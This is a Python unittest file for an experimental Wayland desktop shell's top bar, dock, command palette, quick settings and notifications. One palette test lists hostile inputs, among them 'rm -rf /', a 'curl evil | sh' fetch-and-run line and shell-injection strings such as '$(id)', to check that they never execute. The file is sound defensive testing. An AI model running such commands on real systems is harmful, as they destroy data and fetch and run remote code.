"""Tests for the Bunny shell frame.

BUNNY WAYLAND SHELL EXPERIMENT — NOT RELEASE QUALIFIED — DO NOT USE AS THE
DEFAULT SESSION.

Covers rejections 3 (arbitrary text reaching /bin/sh), 6 (a completed pose or
notification before backend completion) and 18 (mock backend state packaged as
real state).
"""

from __future__ import annotations

import json
from pathlib import Path
import sys
import unittest

from tests.support import ROOT

sys.path.insert(0, str(ROOT / "apps/common"))

from bunny_shell_v3.chrome import DockAction, DockItem, DockModel, Region, TopBarModel
from bunny_shell_v3.model import LayoutMode, ShellState, VisualMode
from bunny_shell_v3.notifications import (
    ActionState,
    Category,
    Notification,
    NotificationCenter,
    TransitionRefused,
    Urgency,
)
from bunny_shell_v3.palette import Behavior, CommandPalette, Result, Source, default_results
from bunny_shell_v3.quicksettings import QuickSettings, SetResult, UNAVAILABLE_LABEL
from bunny_shell_v3.runtime import COMPONENTS, KeyboardMode, character_permitted


class TopBarTests(unittest.TestCase):
    def test_every_required_region_is_populated(self) -> None:
        model = TopBarModel(ShellState())
        for region in Region:
            self.assertTrue(model.items(region), f"{region.value} region must have items")

    def test_the_top_bar_never_shows_the_guide_character(self) -> None:
        model = TopBarModel(ShellState(visual_mode=VisualMode.CHARACTER))
        self.assertFalse(model.character_permitted())
        self.assertFalse(model.contains_character())

    def test_privacy_indicators_appear_exactly_while_active(self) -> None:
        state = ShellState()
        model = TopBarModel(state)
        keys = {item.key for item in model.visible_items(Region.RIGHT)}
        self.assertNotIn("microphone", keys)
        state.set_indicator("microphone", True)
        keys = {item.key for item in model.visible_items(Region.RIGHT)}
        self.assertIn("microphone", keys)

    def test_compact_layout_never_hides_a_privacy_indicator(self) -> None:
        state = ShellState(layout_mode=LayoutMode.COMPACT)
        state.set_indicator("screen-capture", True)
        state.set_indicator("camera", True)
        model = TopBarModel(state)
        keys = {item.key for item in model.visible_items(Region.RIGHT)}
        self.assertIn("screen-capture", keys)
        self.assertIn("camera", keys)

    def test_focus_mode_never_hides_a_privacy_indicator(self) -> None:
        state = ShellState(focus_mode=True)
        state.set_indicator("microphone", True)
        model = TopBarModel(state)
        self.assertIn("microphone", {item.key for item in model.visible_items(Region.RIGHT)})


class DockTests(unittest.TestCase):
    def setUp(self) -> None:
        self.state = ShellState()
        self.dock = DockModel(self.state, max_visible=3)
        for index, name in enumerate(["Files", "Terminal", "Editor", "Browser", "Mail"]):
            self.dock.add(DockItem(entry_id=f"org.bunnyos.{name}", name=name, pinned=True))

    def test_activation_is_a_typed_action_never_a_command(self) -> None:
        action = self.dock.activate("org.bunnyos.Files")
        self.assertEqual(action, DockAction.LAUNCH)
        self.assertIsInstance(action, DockAction)

    def test_a_running_application_is_focused_rather_than_relaunched(self) -> None:
        self.dock.items[0].window_ids = [1]
        self.assertEqual(self.dock.activate("org.bunnyos.Files"), DockAction.FOCUS_EXISTING)

    def test_multiple_windows_offer_a_window_list(self) -> None:
        self.dock.items[0].window_ids = [1, 2]
        self.assertTrue(self.dock.items[0].multiple_windows)
        self.assertEqual(self.dock.activate("org.bunnyos.Files"), DockAction.SHOW_WINDOW_LIST)

    def test_overflow_items_stay_keyboard_reachable(self) -> None:
        self.assertEqual(len(self.dock.visible()), 3)
        self.assertEqual(len(self.dock.overflow()), 2)
        self.assertEqual(len(self.dock.keyboard_order()), 5)

    def test_removing_a_running_application_unpins_rather_than_vanishes(self) -> None:
        self.dock.items[0].window_ids = [1]
        self.assertTrue(self.dock.remove("org.bunnyos.Files"))
        self.assertIn("org.bunnyos.Files", [item.entry_id for item in self.dock.ordered()])
        self.assertFalse(self.dock.items[0].pinned)

    def test_reorder_refuses_an_out_of_range_position(self) -> None:
        self.assertFalse(self.dock.reorder("org.bunnyos.Files", 99))

    def test_the_dock_auto_hides_only_in_focus_mode(self) -> None:
        self.assertFalse(self.dock.auto_hide())
        self.state.focus_mode = True
        self.assertTrue(self.dock.auto_hide())

    def test_the_dock_is_placed_on_one_output(self) -> None:
        self.assertEqual(self.dock.placement_output(["eDP-1", "DP-1"]), "eDP-1")
        self.assertIsNone(self.dock.placement_output([]))

    def test_the_dock_never_shows_the_guide_character(self) -> None:
        self.assertFalse(self.dock.character_permitted())


class CommandPaletteTests(unittest.TestCase):
    def setUp(self) -> None:
        self.palette = CommandPalette()
        for result in default_results():
            self.palette.register(result)

    def test_typed_text_never_becomes_a_command(self) -> None:
        """Rejection 3: arbitrary text reaching /bin/sh."""
        for hostile in [
            "rm -rf /",
            "sh -c 'curl evil | sh'",
            "/bin/sh",
            "$(id)",
            "`whoami`",
            "; reboot",
        ]:
            self.assertEqual(self.palette.search(hostile), [], f"{hostile!r} must match nothing")

    def test_an_unsafe_target_cannot_even_be_registered(self) -> None:
        with self.assertRaises(ValueError):
            self.palette.register(
                Result("evil", "Evil", "", Source.APPLICATIONS, Behavior.OPEN, "sh -c 'rm -rf /'")
            )

    def test_an_empty_query_returns_nothing(self) -> None:
        self.assertEqual(self.palette.search(""), [])
        self.assertEqual(self.palette.search("   "), [])

    def test_every_result_states_its_behavior(self) -> None:
        for result in default_results():
            self.assertIsInstance(result.behavior, Behavior)
            self.assertIn(
                result.behavior.value,
                {"Open", "Switch", "Change", "Approval required", "Privileged", "Power action"},
            )

    def test_privileged_results_route_to_the_approval_backend(self) -> None:
        result = Result(
            "install",
            "Install updates",
            "Requires approval",
            Source.APPROVALS,
            Behavior.APPROVAL_REQUIRED,
            "install-updates",
        )
        self.palette.register(result)
        resolved = self.palette.resolve(result)
        self.assertEqual(resolved["kind"], "approval-request")
        self.assertNotIn("command", resolved)

    def test_the_palette_works_with_bunny_disabled(self) -> None:
        palette = CommandPalette(bunny_enabled=False)
        for result in default_results():
            palette.register(result)
        self.assertTrue(palette.search("workspace"))
        self.assertTrue(palette.search("diagnostics"))
        self.assertTrue(palette.search("power off"))

    def test_all_required_sources_exist(self) -> None:
        expected = {
            "installed applications",
            "open windows",
            "workspaces",
            "Bunny settings",
            "system settings",
            "recent files",
            "diagnostics",
            "approvals",
            "layout modes",
            "visual modes",
            "power actions",
        }
        self.assertEqual({source.value for source in Source}, expected)


class QuickSettingsTests(unittest.TestCase):
    def setUp(self) -> None:
        self.state = ShellState()
        self.settings = QuickSettings(self.state)

    def test_every_required_control_is_present(self) -> None:
        expected = {
            "wifi", "bluetooth", "audio", "microphone", "camera-privacy", "brightness",
            "power-mode", "night-light", "vpn", "accessibility", "focus-mode",
            "compact-layout", "regular-mode", "character-mode", "bunny-enabled",
            "local-only", "updates",
        }
        self.assertEqual(set(self.settings.toggles), expected)

    def test_an_unbacked_control_says_so_and_does_not_flip(self) -> None:
        """Rejection 18: mock backend state presented as real."""
        self.assertEqual(self.settings.set("wifi", True), SetResult.REFUSED_NO_BACKEND)
        self.assertFalse(self.settings.toggles["wifi"].value)
        self.assertEqual(self.settings.toggles["wifi"].status_text(), UNAVAILABLE_LABEL)

    def test_shell_owned_controls_work_because_the_shell_is_the_backend(self) -> None:
        self.assertEqual(self.settings.set("focus-mode", True), SetResult.APPLIED)
        self.assertTrue(self.state.focus_mode)

    def test_switching_visual_mode_is_a_shell_control(self) -> None:
        self.assertEqual(self.settings.set("character-mode", True), SetResult.APPLIED)
        self.assertIs(self.state.visual_mode, VisualMode.CHARACTER)
        self.assertEqual(self.settings.set("regular-mode", True), SetResult.APPLIED)
        self.assertIs(self.state.visual_mode, VisualMode.REGULAR)

    def test_no_mock_state_by_default(self) -> None:
        self.assertFalse(self.settings.contains_mock_state())
        self.assertIn("wifi", self.settings.unavailable_keys())

    def test_an_unknown_control_is_refused(self) -> None:
        self.assertEqual(self.settings.set("teleport", True), SetResult.UNKNOWN_TOGGLE)


class NotificationTests(unittest.TestCase):
    def test_completed_requires_backend_confirmation(self) -> None:
        """Rejection 6, in its notification form."""
        notification = Notification(
            app_id="bunny", summary="Install updates", category=Category.BUNNY_ACTION
        )
        notification.advance(ActionState.WAITING_FOR_APPROVAL)
        notification.advance(ActionState.RUNNING)
        with self.assertRaises(TransitionRefused):
            notification.advance(ActionState.COMPLETED)
        notification.advance(ActionState.COMPLETED, backend_confirmed=True)
        self.assertIs(notification.action_state, ActionState.COMPLETED)

    def test_a_proposed_action_cannot_jump_straight_to_completed(self) -> None:
        notification = Notification(app_id="bunny", summary="x", category=Category.BUNNY_ACTION)
        with self.assertRaises(TransitionRefused):
            notification.advance(ActionState.COMPLETED, backend_confirmed=True)

    def test_every_required_action_state_exists(self) -> None:
        self.assertEqual(
            {state.value for state in ActionState},
            {"proposed", "waiting for approval", "running", "completed", "failed", "rolled back"},
        )

    def test_do_not_disturb_suppresses_banners_but_not_records(self) -> None:
        center = NotificationCenter()
        center.do_not_disturb = True
        shown = center.post(Notification(app_id="mail", summary="New mail"))
        self.assertFalse(shown)
        self.assertEqual(len(center.history()), 1)
        self.assertEqual(center.live(), [])

    def test_a_critical_notification_still_interrupts_during_do_not_disturb(self) -> None:
        center = NotificationCenter()
        center.do_not_disturb = True
        shown = center.post(
            Notification(app_id="system", summary="Battery critical", urgency=Urgency.CRITICAL)
        )
        self.assertTrue(shown)

    def test_notifications_group_by_application(self) -> None:
        center = NotificationCenter()
        center.post(Notification(app_id="mail", summary="One"))
        center.post(Notification(app_id="mail", summary="Two"))
        center.post(Notification(app_id="chat", summary="Three"))
        groups = center.groups()
        self.assertEqual(len(groups["mail"]), 2)
        self.assertEqual(len(groups["chat"]), 1)

    def test_a_notification_never_takes_keyboard_focus(self) -> None:
        self.assertFalse(NotificationCenter().takes_focus())

    def test_history_is_bounded(self) -> None:
        center = NotificationCenter(history_limit=5)
        for index in range(20):
            center.post(Notification(app_id="spam", summary=str(index)))
        self.assertEqual(len(center.history()), 5)


class ComponentSurfaceTests(unittest.TestCase):
    def test_passive_chrome_never_requests_the_keyboard(self) -> None:
        for name in ("top-bar", "dock"):
            self.assertIs(COMPONENTS[name].keyboard, KeyboardMode.NONE)

    def test_user_invoked_surfaces_take_the_keyboard(self) -> None:
        for name in ("command-palette", "launcher", "approval-panel", "lock-screen"):
            self.assertIs(COMPONENTS[name].keyboard, KeyboardMode.EXCLUSIVE)

    def test_no_chrome_is_drawn_by_the_compositor(self) -> None:
        for directory in sorted((ROOT / "shell-ui").iterdir()):
            manifest = directory / "component.json"
            if not manifest.is_file():
                continue
            data = json.loads(manifest.read_text(encoding="utf-8"))
            self.assertFalse(data["drawnByCompositor"], f"{directory.name} must be a client surface")
            self.assertTrue(data["requiresExperimentalMode"])
            self.assertEqual(data["toolkit"], "GTK 4")

    def test_the_character_is_refused_on_authentication_surfaces(self) -> None:
        self.assertFalse(character_permitted("lock-screen"))
        self.assertFalse(character_permitted("top-bar"))
        self.assertFalse(character_permitted("dock"))
        self.assertFalse(character_permitted("nonexistent-component"))

    def test_only_the_top_bar_and_dock_reserve_space(self) -> None:
        reserving = {name for name, spec in COMPONENTS.items() if spec.exclusive_zone > 0}
        self.assertEqual(reserving, {"top-bar", "dock"})


if __name__ == "__main__":
    unittest.main()
